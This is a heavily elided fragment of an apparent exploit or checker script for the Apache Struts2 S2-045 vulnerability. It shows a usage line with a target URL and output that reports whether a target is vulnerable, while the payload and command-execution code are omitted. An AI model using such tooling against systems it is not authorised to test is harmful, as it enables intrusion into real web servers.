...
if len(sys.argv)!=2:
    ...
    print('+ EXP: python3 struts2-045_cmd.py freeerror.org/login.action +')
...
try:
    ...
    print ("[-] The target does not have Struts2-045 vulnerability")
    exit()
if testpoc == '54289':
    print ("[+] The target has a Struts2-045 vulnerability")
